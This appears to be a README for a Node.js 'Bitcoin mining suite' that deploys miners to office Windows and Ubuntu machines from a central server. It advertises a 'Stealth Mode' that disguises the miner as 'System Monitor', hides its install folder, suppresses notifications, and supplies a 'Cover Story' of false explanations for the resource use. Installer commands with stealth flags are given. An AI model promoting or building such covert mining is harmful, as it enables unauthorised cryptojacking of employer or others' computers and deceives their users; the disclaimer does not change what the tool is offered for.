# 🚀 Advanced Bitcoin Mining Suite

A comprehensive, cross-platform cryptocurrency mining management system with real-time dashboard, security features, and stealth capabilities.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Node.js](https://img.shields.io/badge/Node.js-16.0+-green.svg)](https://nodejs.org/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-blue.svg)](https://github.com/yourusername/advanced-bitcoin-mining-suite)

## 🎯 Overview

The Advanced Bitcoin Mining Suite is a sophisticated system that allows you to:

- **Deploy mining clients** to multiple Windows 11 and Ubuntu computers
- **Centralized control** from your Fedora Linux host server
- **Real-time monitoring** of all mining operations through a web dashboard
- **Enterprise-grade security** with authentication, encryption, and monitoring
- **Stealth features** for discreet operation (optional)
- **Cross-platform compatibility** with automated deployment scripts

## ✨ Features

### 🏢 Office Network Mining
- Multi-device mining management
- Real-time performance monitoring
- Automated deployment scripts
- Centralized configuration

### 💰 Bitcoin Mining
- SHA-256 Bitcoin mining on CPU and GPU
- Pool mining with automatic failover
- Real-time profitability calculation
- Earnings tracking and analytics

### 🔒 Security Features
- Multi-layered authentication system
- Wallet address encryption and validation
- DDoS protection and IP filtering
- Rate limiting and suspicious activity detection
- Comprehensive audit trails

### 🥷 Stealth Mode (Optional)
- Process disguise (appears as "System Monitor")
- Hidden installation directories
- Innocuous log messages
- Silent operation without notifications

### 🌐 Cross-Platform Support
- **Host Server**: Fedora Linux (optimized with cluster support)
- **Clients**: Windows 11, Ubuntu/Debian
- **Deployment**: Automated installers and web-based setup

## 🚀 Quick Start

### Prerequisites
- Node.js 16.0+ and npm 8.0+
- Fedora Linux host server
- Windows 11 or Ubuntu client computers
- Bitcoin wallet address

### Installation

1. **Clone the repository**:
   ```bash
   git clone https://github.com/yourusername/advanced-bitcoin-mining-suite.git
   cd advanced-bitcoin-mining-suite
   ```

2. **Install dependencies**:
   ```bash
   npm install
   ```

3. **Start the server**:
   ```bash
   npm start
   ```

4. **Access the dashboard**:
   - Open your browser and go to: `http://localhost:3000`
   - Configure your Bitcoin wallet address
   - Deploy clients to office computers

## 📖 Documentation

- **[System Overview](SYSTEM-OVERVIEW.md)** - Complete system documentation
- **[Security Guide](SECURITY-GUIDE.md)** - Security configuration and best practices
- **[Windows Deployment](README-Windows.md)** - Windows 11 client setup guide
- **[API Documentation](docs/API.md)** - REST API endpoints and usage

## 🏗️ Architecture

```
┌─────────────────────────────────────┐
│           Fedora Linux Host         │
│  ┌─────────────────────────────────┐ │
│  │     Web Dashboard (Port 3000)   │ │
│  │  • Real-time mining statistics  │ │
│  │  • Client management            │ │
│  │  • Security monitoring          │ │
│  │  • Wallet configuration         │ │
│  └─────────────────────────────────┘ │
│  ┌─────────────────────────────────┐ │
│  │    Central Mining Manager       │ │
│  │  • Client communication         │ │
│  │  • Mining coordination          │ │
│  │  • Performance monitoring       │ │
│  └─────────────────────────────────┘ │
│  ┌─────────────────────────────────┐ │
│  │    Security Systems             │ │
│  │  • Authentication & encryption  │ │
│  │  • Network protection           │ │
│  │  • Wallet security              │ │
│  └─────────────────────────────────┘ │
└─────────────────────────────────────┘
```

## 🔧 Configuration

### Environment Variables
```bash
# Server Configuration
PORT=3000
HOST=0.0.0.0
NODE_ENV=production

# Security Configuration
SECRET_KEY=your-secret-key-here
ENCRYPTION_KEY=your-encryption-key-here
JWT_EXPIRY=24h

# Network Security
MAX_CONNECTIONS_PER_IP=10
DDOS_THRESHOLD=100
ENABLE_GEO_BLOCKING=false

# Wallet Security
MAX_WALLET_CHANGES=3
REQUIRE_CONFIRMATION=true
ENABLE_WHITELIST=false
```

### Bitcoin Wallet Setup
1. **Recommended Wallets**:
   - **Electrum** (Maximum security)
   - **Exodus** (User-friendly)
   - **Coinbase** (Quick setup)

2. **Address Types**:
   - **Legacy (1...)** - Most compatible
   - **SegWit (3...)** - Good balance
   - **Bech32 (bc1...)** - **Recommended** for lowest fees

## 🚀 Deployment

### Windows 11 Clients
```powershell
# Download and run installer
.\windows-installer.ps1 -CentralServerIP "YOUR_FEDORA_IP" -StealthMode
```

### Ubuntu Clients
```bash
# Download and run installer
chmod +x ubuntu-installer.sh
./ubuntu-installer.sh --server YOUR_FEDORA_IP --stealth
```

### Web-Based Installation
- Access: `http://localhost:3000/installer`
- Follow browser-based installation guide

## 📊 API Endpoints

### Core Endpoints
- `GET /api/stats` - Mining statistics
- `GET /api/security/status` - Security status
- `POST /api/wallet/configure` - Configure wallet
- `GET /api/office-network` - Client status

### Security Endpoints
- `GET /api/security/status` - Security dashboard
- `POST /api/security/block-ip` - Block IP address
- `POST /api/security/unblock-ip` - Unblock IP address

## 🔒 Security Features

### Authentication & Authorization
- JWT token authentication
- Password strength validation
- Rate limiting and session management
- Multi-factor authentication support

### Wallet Security
- Address validation and encryption
- Change tracking and limits
- Whitelist support
- Integrity verification

### Network Security
- DDoS protection
- IP filtering and blocking
- Connection limits
- Geo-blocking support

## 🥷 Stealth Mode

### What Gets Disguised
- **Process Name**: "System Monitor" instead of "Bitcoin Miner"
- **Window Title**: "System Performance Monitor"
- **Installation Folder**: Hidden in system directories
- **Log Messages**: Innocuous system messages
- **Notifications**: Disabled or disguised

### Cover Story
- **Purpose**: "System performance monitoring and optimization"
- **Why Running**: "Automatically optimizing computer performance"
- **Resource Usage**: "Monitoring system health and performance"

## 📈 Performance

### Server Optimization
- Cluster mode for multi-core utilization
- Gzip compression for web content
- Static file caching
- Rate limiting and connection pooling

### Client Optimization
- Platform-specific optimizations
- Dynamic thread management
- Temperature monitoring
- Automatic performance tuning

## 🛠️ Development

### Prerequisites
- Node.js 16.0+
- npm 8.0+
- Git

### Development Setup
```bash
# Clone repository
git clone https://github.com/yourusername/advanced-bitcoin-mining-suite.git

# Install dependencies
npm install

# Start development server
npm run dev

# Run tests
npm test

# Lint code
npm run lint
```

### Project Structure
```
├── src/
│   ├── core/           # Core mining engine
│   ├── security/       # Security systems
│   ├── deployment/     # Client deployment scripts
│   ├── dashboard/      # Web dashboard
│   ├── config/         # Configuration files
│   └── utils/          # Utility functions
├── docs/               # Documentation
├── scripts/            # Build and deployment scripts
└── public/             # Static files
```

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## ⚠️ Disclaimer

This software is for educational and legitimate mining purposes only. Users are responsible for:

- Complying with local laws and regulations
- Understanding the risks of cryptocurrency mining
- Ensuring proper authorization for all mining activities
- Monitoring system performance and resource usage

## 🆘 Support

- **Documentation**: Check the [docs](docs/) folder
- **Issues**: Report bugs via [GitHub Issues](https://github.com/yourusername/advanced-bitcoin-mining-suite/issues)
- **Security**: Report security issues privately

## 🎯 Roadmap

- [ ] GPU mining optimization
- [ ] Mobile dashboard app
- [ ] Advanced analytics
- [ ] Multi-currency support
- [ ] Cloud deployment options

---

## 🎉 Getting Started

Ready to start mining Bitcoin? 

1. **Set up your Bitcoin wallet** (recommend Electrum)
2. **Deploy the server** on your Fedora Linux host
3. **Configure your wallet** in the dashboard
4. **Deploy clients** to your office computers
5. **Start mining** and watch your earnings grow!

**Happy Mining!** 🚀💰

---

*Made with ❤️ for the Bitcoin community*